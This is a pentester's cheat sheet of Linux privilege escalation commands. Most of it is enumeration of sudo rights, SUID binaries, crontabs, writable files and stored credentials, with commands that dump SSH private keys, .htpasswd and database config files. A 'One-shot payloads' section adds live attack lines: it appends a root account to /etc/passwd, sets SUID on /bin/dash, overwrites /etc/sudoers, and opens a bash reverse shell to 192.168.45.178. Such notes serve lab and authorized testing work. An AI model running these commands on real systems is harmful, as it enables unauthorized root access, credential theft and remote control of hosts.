### Linux Privilege Escalation (Condensed version of notes/linux_privesc.md)

```bash
# Proper shell
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp:/snap/bin
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
# Ctrl + Z (Background Process)
stty raw -echo ; fg ; reset
stty columns 200 rows 200

# Basic
id ; env ; hostname ; /etc/issue ; /etc/os-release ; uname -a ;
systemctl show-environment # show system path

# Users
getent passwd | grep -v 'sshd' | grep 'sh\|:0:' --color
getent group

# Ports
( ip a || ifconfig )
( netstat -punta || ss -nltpu || netstat -anv ) | grep -i listen ) 2>/dev/null
netstat -punta | grep -E ':3389|:3350'
ps -fp $pid

# Pray
sudo -l

# SUIDs and GUIDs
ll $(find / -perm -u=s -type f 2>/dev/null ) && ll $(find / -perm -g=s -type f 2>/dev/null )

# Capabilities
/usr/sbin/getcap -r / 2>/dev/null

# Crontabs
crontab -l
sudo crontab -l
crontab -l -u $user
ll -R /etc/cron* /var/spool/cron*
cat /etc/cron* /etc/cron*/* /var/spool/cron/* /var/spool/cron/*/*

# Writable files and directories
ll -f $(find . -writable 2>/dev/null)
ll -f $(find . -writable -user $(whoami) 2>/dev/null) # or another interesting  user
ll -f $(find . -writable -group $(group) 2>/dev/null)

# Executable files and directories
ll -d $(find . -executable 2>/dev/null)
ll -d $(find . -executable -user $(whoami) 2>/dev/null)
ll -d $(find . -executable -group $(whoami) 2>/dev/null)

# Outdated software
apt list --upgradable
dpkg -l
lsmod
/sbin/modinfo libata

# File Enumeration
ll /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root

# MySQL
mysql --version

# One-shot payloads injects
echo "w00t:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
chmod 4777 /bin/dash ; /bin/dash -p
echo “apache ALL=(root) NOPASSWD: ALL” > /etc/sudoers
bash -i >& /dev/tcp/192.168.45.178/80 0>&1

# File enumeration
grep "CRON" /var/log/syslog

# Apache
cat /var/log/apache/access.log /var/log/apache/error.log /var/log/apache2/access.log /var/log/apache2/error.log
/etc/apache2/.htpasswd /etc/apache2/ports.conf /etc/apache2/sites-enabled/domain.conf /etc/apache2/sites-available/domain.conf /etc/apache2/sites-available/000-default.conf /usr/local/apache2/conf/httpd.conf -al /usr/local/apache2/htdocs/

# Nginx
cat /var/log/nginx/access.log /var/log/nginx/error.log /etc/nginx/nginx.conf /etc/nginx/conf.d/.htpasswd /etc/nginx/sites-available/example.com.conf /etc/nginx/sites-enabled/example.com.conf /usr/local/nginx/conf/nginx.conf /usr/local/etc/nginx/nginx.conf

# PHP web conf
cat /etc/php/*\.*/apache2/php.ini /etc/php/*\.*/cli/php.ini /etc/php/*\.*/fpm/php.ini

# MySQL (MariaDB)
cat /etc/mysql/my.cnf /etc/mysql/debian.cnf /etc/mysql/mariadb.cnf /etc/mysql/conf.d/mysql.cnf /etc/mysql/

# SSH keys
ll /home /root /etc/ssh /home/*/.ssh/; locate id_rsa; locate id_dsa; find / -name id_rsa 2> /dev/null; find / -name id_dsa 2> /dev/null; find / -name authorized_keys 2> /dev/null; cat /home/*/.ssh/id_rsa; cat /home/*/.ssh/id_dsa

# Modified in last 10 minutes
find / -type f -mmin -10 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/var/lib/*" ! -path "/private/var/*" -printf '%T+ %p\n' 2>/dev/null | head -100 | sort -r

# Interesting files, add other programs such as pl,go,..
ll -d $(find /var/www -iregex '.*site-packages.*\|^.*/\.cargo.*\|.*stable-x86_64.*' -prune -o -iregex ".*\.kdbx\|.*\.ini\|.*\.conf\|.*\.cnf\|.*\.config.*\|.*\.db\|.*\.y*ml\|.*\.txt\|.*\.xml\|.*\.json\|.*\.dat\|.*\.secrets\|.*\..*rc\|.*\.env.*\|.*\.bak\|.*\.inf\|.*\.sql.*\|.*\.key\|.*\.sav\|.*\.log\|.*\.settings\|.*\.vcl\|.*conf.*\.php.*\|.*admin.*\.php\|database\.php\|db\.php\|storage\.php\|settings\.php\|installer\.php\|config\.inc\.php\|.*pass.*\.php\|.*\..*sh\|.*\.py\|^.*/\.[^/]*$" 2>/dev/null)
ll -d $(find /home -iregex ".*\.kdbx\|.*\.ini\|.*\.conf\|.*\.cnf\|.*\.config.*\|.*\.db\|.*\.yml\|.*\.yaml\|.*\.txt\|.*\.xml\|.*\.json\|.*\.dat\|.*\.secrets\|.*\..*rc\|.*\.env.*\|.*\.bak\|.*\.inf\|.*\.sql.*\|.*\.key\|.*\.sav\|.*\.log\|.*\.settings\|.*\.vcl\|.*conf.*\.php.*\|.*admin.*\.php\|database\.php\|db\.php\|storage\.php\|settings\.php\|installer\.php\|config\.inc\.php\|.*pass.*\.php\|.*\..*sh\|.*\.py\|^.*/\.[^/]*$" 2>/dev/null) | grep -Ev "\.conda\|pip"
# seems to pick up every php file

# What's been modified after..
touch -t 202401031231.43 /tmp/wotsit
find / -newer /tmp/wotsit -print 2>/dev/null

```